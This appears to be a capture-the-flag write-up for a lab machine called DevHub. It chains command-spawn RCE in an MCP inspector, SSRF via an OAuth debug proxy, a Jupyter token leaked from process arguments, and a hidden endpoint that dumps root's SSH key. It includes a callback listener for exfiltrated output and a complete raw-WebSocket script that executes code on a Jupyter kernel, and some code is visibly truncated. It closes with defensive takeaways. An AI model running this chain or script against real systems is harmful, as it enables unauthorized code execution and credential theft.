Machine Overview

DevHub chains four distinct vulnerabilities across an MCP developer tooling stack. The MCPJam Inspector on port 6274 allows arbitrary command spawning via its /api/mcp/connect endpoint, giving an initial shell as mcp-dev. An OAuth debug proxy enables SSRF to discover internal services including a Jupyter server and a root-owned Flask API. The Jupyter token — leaked from process arguments — is used to execute code as analyst via a stdlib-only RFC 6455 WebSocket client (no websockets library available). From analyst, an OPSMCP API key unlocks a hidden ops._admin_dump endpoint that dumps root's SSH private key.

◈
Full Attack Chain: MCPJam /api/mcp/connect arbitrary command spawn → RCE as mcp-dev → OAuth proxy SSRF discovers Jupyter:8888 + OPSMCP:5000 → ps aux leaks Jupyter token → raw RFC 6455 websocket (stdlib-only) executes code as analyst → /home/analyst/.opsmcp_key found → OPSMCP hidden tool ops._admin_dump dumps root SSH key → SSH as root.

Initial Access — MCPJam Command Spawn RCE

02
Arbitrary Command Execution via /api/mcp/connect
RCE · Phase 02

The /api/mcp/connect endpoint accepts a serverConfig object containing command and args fields. The backend spawns the specified binary as a subprocess to launch an MCP server — with no validation or allowlisting. The connection returns an error (no valid MCP protocol response), but the command executes. Output is exfiltrated via a curl callback to an attacker listener.

bash — confirm RCE via callback

python3 -c "
import http.server, socketserver
class H(http.server.BaseHTTPRequestHandler):

        print(self.rfile.read(int(self.headers['Content-Length'])).decode())
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
socketserver.TCPServer(('0.0.0.0', 4444), H).serve_forever()
" &

# Trigger RCE

  -H "Content-Type: application/json" \

Pivot — Jupyter WebSocket (stdlib-only RFC 6455)

05
The Challenge — No websockets Library
Jupyter · Phase 05

Jupyter code execution requires connecting to a kernel's WebSocket channel — but the target has no websocket or websockets Python package installed. The solution: implement the RFC 6455 WebSocket protocol from scratch using only Python stdlib (socket, struct, random, urllib.request).

◈
RFC 6455 WebSocket Frame Format (Client → Server):
• Byte 0: 0x81 = FIN bit + text opcode (0x1)
• Byte 1: MSB set (mask bit) + payload length (0–125) or 126/127 for extended
• Bytes 2–5: 4-byte random masking key
• Payload: each byte XORed with mask[i % 4]
Client-to-server frames must be masked per spec. Server-to-client frames are unmasked.
06
Raw RFC 6455 Exploit Script
Jupyter · Phase 06

The exploit: create a kernel via REST API, perform the HTTP Upgrade handshake manually over a raw TCP socket, send a Jupyter execute_request message as a masked WebSocket frame, then parse the response frames to capture command output.

python3 — ws_exploit.py (stdlib only)
import json, socket, struct, random, urllib.request, base64 as b

T   = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
CMD = "import subprocess; print(subprocess.check_output(['id'],text=True).strip())"

# 1. Create kernel via REST
req = urllib.request.Request(
    f'http://127.0.0.1:8888/api/kernels?token={T}',
    method='POST', headers={'Content-Type':'application/json'}, data=b'{}'
)
kid = json.loads(urllib.request.urlopen(req, timeout=5).read())['id']

# 2. TCP + HTTP Upgrade
s = socket.socket()
s.connect(('127.0.0.1', 8888))
ws_key = b.b64encode(bytes(random.randint(0,255) for _ in range(16))).decode()
s.send((
    f'GET /api/kernels/{kid}/channels?token={T} HTTP/1.1\r\n'
    f'Host: 127.0.0.1:8888\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n'
    f'Sec-WebSocket-Key: {ws_key}\r\nSec-WebSocket-Version: 13\r\n\r\n'
).encode())
resp = b''
while b'\r\n\r\n' not in resp: resp += s.recv(1024)  # wait for 101

# 3. Build masked text frame (RFC 6455)
def ws_frame(data):
    L = len(data)
    h = bytearray([0x81, 0x80 | L]) if L <= 125 else \
        bytearray([0x81, 0xFE]) + bytearray(struct.pack('>H', L))
    mask = bytes(random.randint(0,255) for _ in range(4))
    h += mask
    for i, x in enumerate(data): h.append(x ^ mask[i % 4])
    return bytes(h)

# 4. Send execute_request
msg = json.dumps({
    "header": {"msg_id":"1","username":"","session":"1",
               "msg_type":"execute_request","version":"5.0"},
    "parent_header":{}, "metadata":{},
    "content":{"code":CMD,"silent":False,"store_history":True}
}).encode()
s.send(ws_frame(msg))

# 5. Read frames + print output
s.settimeout(3)
while True:
    hdr = s.recv(2)
    if len(hdr) < 2: break
    ml = hdr[1]
    L = ml & 0x7f
    if L == 126: L = struct.unpack('>H', s.recv(2))[0]
    elif L == 127: L = struct.unpack('>Q', s.recv(8))[0]
    mkey = s.recv(4) if ml & 0x80 else None
    payload = b''
    while len(payload) < L: payload += s.recv(L - len(payload))
    if mkey: payload = bytes(x ^ mkey[i%4] for i,x in enumerate(payload))
    if (hdr[0] & 0x0f) == 8: break
    print(payload.decode('utf-8', 'replace'))

key takeaways
// 01
MCP Server Spawn APIs Are OS Command Injection
Accepting arbitrary command and args fields to spawn subprocesses is direct OS command injection. MCP server launch must use a strict allowlist of approved binaries and arguments, with sandboxed execution in a container or restricted namespace. The request must require authentication.
// 02
Debug Proxy Endpoints Are SSRF by Design
An OAuth debug proxy that forwards arbitrary URLs to internal services is a complete internal network scanner. Debug and proxy endpoints must be removed before production deployment — not rate-limited, not IP-restricted. If required for debugging, they must be gated behind a separate authenticated admin interface.
// 03
Process Arguments Are World-Readable Secrets
Any credential passed as a command-line argument is readable by all users on the system via ps aux or /proc/[pid]/cmdline. Jupyter tokens, database passwords, API keys, and all other secrets must be passed via environment variables (with appropriate restrictions), config files with mode 0600, or a secrets management service.
// 04
RFC 6455 Can Be Implemented Without Libraries
When a target environment lacks third-party websocket libraries, the raw protocol can be implemented using only Python stdlib (socket, struct, random, urllib.request). The masking key XOR, frame format, and HTTP Upgrade handshake are straightforward to implement and bypass the assumption that websocket access requires a full client library.
// 05
Hidden API Endpoints Are Production Backdoors
The ops._admin_dump tool — omitted from /tools/list — is a backdoor. Security through obscurity provides no protection once source code is readable by a compromised service account. Every API endpoint must be explicitly documented, require authentication, and be subject to the same security review as all other endpoints regardless of whether it appears in public listings.
// 06
Source Maps Must Not Ship to Production
The .js.map file exposed the complete internal API surface — endpoint paths, request shapes, and business logic. Source maps must be excluded from production builds or served only to authenticated developers via a separate internal endpoint. They are equivalent to providing attackers with full application source code.
